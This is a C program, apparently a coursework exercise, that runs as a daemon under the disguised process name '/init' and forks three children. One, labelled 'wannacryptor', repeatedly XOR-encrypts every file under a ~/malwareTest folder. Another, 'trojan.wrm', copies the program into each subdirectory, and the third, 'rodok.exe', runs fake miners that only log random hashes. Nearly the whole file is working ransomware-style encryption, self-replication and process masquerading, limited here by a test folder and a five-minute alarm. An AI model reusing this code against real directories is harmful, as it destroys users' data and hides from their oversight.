#define _DEFAULT_SOURCE
#define _BSD_SOURCE
#define _XOPEN_SOURCE 700
#include <dirent.h>
#include <stdio.h> 
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <stdarg.h>
#include <syslog.h>
#include <signal.h>
#include <time.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <syslog.h>
#define ERROR_LOG_PATH "/tmp/daemonLogs.log"

// Helper function to write error logs
void log_error(const char *format, ...) {
  va_list args;
  va_start(args, format);
  
  // Open log file
  FILE *log = fopen(ERROR_LOG_PATH, "a");
  if (!log) return;
  
  // Get current time
  time_t now = time(NULL);
  struct tm *t = localtime(&now);
  
  // Write the message
  fprintf(log, "[%04d-%02d-%02d %02d:%02d:%02d] ",
          t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
          t->tm_hour, t->tm_min, t->tm_sec);
  vfprintf(log, format, args);
  fprintf(log, "\n");
  
  fclose(log);
  va_end(args);
}

// function: helper to set name
void set_process_name(const char *name) {
  prctl(PR_SET_NAME, name, NULL, NULL, NULL);
}

// function: miner process
void miner_process(int miner_id) {
  srand(time(NULL) ^ (miner_id << 16));
  
  while (1) {
      char hash[65];
      for (int i = 0; i < 32; i++) {
          unsigned char byte = rand() % 256;
          sprintf(hash + 2*i, "%02x", byte);
      }
      hash[64] = '\0';

      time_t now = time(NULL);
      struct tm *t = localtime(&now);

      FILE *log_file = fopen("/tmp/.miner.log", "a");
      if (log_file) {
          fprintf(log_file, "[%04d-%02d-%02d %02d:%02d:%02d][Miner %d] %s\n",
                  t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
                  t->tm_hour, t->tm_min, t->tm_sec, miner_id, hash);
          fclose(log_file);
      }

      sleep(rand() % 13 + 3);
  }
}

// function: start rodok
void start_rodok() { 
  int num_miners = sysconf(_SC_NPROCESSORS_ONLN);
  if (num_miners < 3) num_miners = 3;

  for (int i = 0; i < num_miners; i++) {
      pid_t pid = fork();
      if (pid == 0) {
          char process_name[20];
          snprintf(process_name, sizeof(process_name), "mine-crafter-%d", i);
          set_process_name(process_name);
          miner_process(i);
          exit(EXIT_SUCCESS);
      } else if (pid < 0) {
          log_error("Fork failed for miner %d", i);
      }
  }

  while (1) {
      sleep(1);
  }
}

// function: spread malware to directories
void spread_malw(const char *source_path, const char *target_dir) {
  DIR *dir = opendir(target_dir);
  if (!dir) {
    log_error("Failed to open target directory: %s (%s)", target_dir, strerror(errno));
    return;
  }

  struct dirent *entry; 
  while ((entry = readdir(dir)) != NULL) {
    if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
      continue; // Skip current and parent directories
    }

    char full_path[1024];
    snprintf(full_path, sizeof(full_path), "%s/%s", target_dir, entry->d_name);

    if (entry->d_type == DT_DIR) {
      char new_path[1024]; 
      snprintf(new_path, sizeof(new_path), "%s/malware_copy", full_path);
      /* char command[2048]; 
      snprintf(command, sizeof(command), "cp -f '%s' '%s/malware_copy'", source_path, full_path);
      system(command);  */

      // make the new directory 
      if (mkdir(new_path, 0755) == -1) {
        if (errno != EEXIST) { 
            log_error("Failed to create directory %s: %s", new_path, strerror (errno));
            continue;
          }
      }

      char dest_file[2048];
      snprintf(dest_file, sizeof(dest_file), "%s/malware", new_path);

      pid_t pid = fork();
      if (pid < 0) { // check: fork failure
        log_error("Fork failed: %s", strerror(errno));
        // perror("Failed to fork process");
        continue;
      } else if (pid == 0) { // child process
        // execute cp command
        execlp("cp", "cp", "-f", "--preserve=all", source_path, new_path, NULL);
        // if failed
        log_error("execlp failed: %s (Src: %s -> Dest: %s)", strerror(errno), source_path, new_path);
        exit(EXIT_FAILURE);
      } else { // parent process
        waitpid(pid, NULL, 0);; // wait for child process to finish
      }
    }
  }
  closedir(dir);
}

// function: alarm self destruct
void selfDestruct(int sig) {
  log_error("Self-destruct triggered");
  exit(0);
}

// function: encrypt files using XOR cipher
void xor_encrypt(const char *input_path, int key) {
  FILE *input_file = fopen(input_path, "rb+");
  if (!input_file) { // check: file open failure
    log_error("Failed to open file: %s (%s)", input_path, strerror(errno));
    return;
  }

  int ch; 
  while ((ch = fgetc(input_file)) != EOF) {
    fseek(input_file, -1, SEEK_CUR);
    fputc(ch ^ key, input_file);
    fflush(input_file);
  }

  fclose(input_file);
}

// function: encrypt directory and its contents
void encrypt_dir(const char *path, int key) {
  DIR *dir = opendir(path);
  if (!dir) {
    log_error("Failed to open directory: %s (%s)", path, strerror(errno));
    return;
  }

  struct dirent *entry;
  while ((entry = readdir(dir)) != NULL) {
    if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
      continue; // Skip current and parent directories
    }

    char full_path[1024];
    snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);

    if (entry->d_type == DT_DIR) {
      // If it's a directory, recursively encrypt it
      encrypt_dir(full_path, key);
    } else if (entry->d_type == DT_REG) {
      // If it's a regular file, encrypt it
      xor_encrypt(full_path, key);
    }

  }
  closedir(dir);
}

// main function to create a daemon process
int main(int argc, char *argv[]) {
  // initialize error log
  FILE *test_log = fopen(ERROR_LOG_PATH, "a");
  if (!test_log) {
    perror("Failed to initialize error log"); // Hanya untuk debugging awal
    exit(EXIT_FAILURE);
  }
  fclose(test_log);

  
  // getting the path to runme
  char self_path[1024];
  ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
  if (len == -1) {
    log_error("Failed to get executable path: %s", strerror(errno));
    exit(EXIT_FAILURE);
  }
  self_path[len] = '\0'; // null-terminate the string
  
  // getting the home directory
  char *env_home = getenv("HOME");
  if (env_home == NULL) {
    log_error("Failed to get HOME environment variable: %s", strerror(errno));
    exit(EXIT_FAILURE);
  }
  
  char home[1024];  // buffer final
  // strncpy(home, env_home, sizeof(home));
  snprintf(home, sizeof(home), "%s/malwareTest", env_home);
  home[sizeof(home) - 1] = '\0'; // null-termination safety
  
  // declaration: id process
  pid_t pid, sid; 
  pid = fork();
  if (pid < 0) { // check: fork failure
    log_error("Fork failed: %s", strerror(errno));
    exit(EXIT_FAILURE);
  }
  
  if (pid > 0) { // check: fork parent success
    exit(EXIT_SUCCESS);
  }
  
  // allowing the child to run in the background
  umask(0);
  
  // separate from terminal 
  sid = setsid();
  if (sid < 0) { // check: setsid failure
    log_error("setsid failed: %s", strerror(errno));
    exit(EXIT_FAILURE);
  }
  
  // change working directory
  if ((chdir("/")) < 0) {
    exit(EXIT_FAILURE);
  }
  
  // close standard file descriptors
  close(STDIN_FILENO);
  close(STDOUT_FILENO);
  close(STDERR_FILENO);
  
  // changing the command name
  if (pid == 0) {
    strncpy(argv[0], "/init1", 50); // init1 temporarily for testing
    argv[0][50] = '\0'; // ensure null termination
    set_process_name("/init");
  }
  
  // file: daemon log
  FILE *log_file = fopen("/tmp/daemon.log", "a");
  if (log_file == NULL) {
    log_error("Failed to open log file");
    exit(EXIT_FAILURE);
  }
  fprintf(log_file, "Daemon started with PID: %d\n", getpid());
  
  // first feature
  pid_t wannacryptor_pid = fork();
  if (wannacryptor_pid == 0) {
      set_process_name("wannacryptor");
      while (1) {
          time_t timestamp = time(NULL);
          encrypt_dir(home, (int)(timestamp % 256));
          fprintf(log_file, "Encryption performed at %ld\n", timestamp);
          fflush(log_file);
          sleep(30);
      }
    } else if (wannacryptor_pid < 0) {
      log_error("Fork failed for wannacryptor: %s", strerror(errno));
      exit(EXIT_FAILURE);
    } 
  fclose(log_file);
    
  // second feature
  pid_t trojan_pid = fork();
  if (trojan_pid == 0) {
      set_process_name("trojan.wrm");
      while (1) {
          spread_malw(self_path, home);
          sleep(30);
      }
  } else if (trojan_pid < 0) {
      log_error("Fork failed for trojan: %s", strerror(errno));
      exit(EXIT_FAILURE);
  }
  
  // second feature
  pid_t rodok_pid = fork();
  if (rodok_pid == 0) {
      set_process_name("rodok.exe");
      start_rodok(); 
  } else if (rodok_pid < 0) {
      log_error("Fork failed for rodok: %s", strerror(errno));
      exit(EXIT_FAILURE);
  }

  // safety measure
  // process running limitation
  /* int max_runs = 5;
  int current_run = 0;
  while (current_run < max_runs) {
    current_run++;
    sleep(30);
    } */
   
   // file: daemon pid
   FILE *pid_file = fopen("/tmp/daemon.pid", "w");
  if (pid_file == NULL) {
    log_error("Failed to open PID file");
    exit(EXIT_FAILURE);
  }
  fprintf(pid_file, "%d", getpid());
  fclose(pid_file);

  
  // alarm signal safety measure
  signal(SIGALRM, selfDestruct);
  alarm(300); // Set alarm for 5 minutes
  
  // checking stuff out
  log_error("this is selfpath: %s", self_path);
  log_error("this is home: %s", home);
  
  time_t timestamp = time(NULL); // Get current time
  
  // daemon process loop
  while (1) {
    sleep(1);
  }
  
  return 0;
}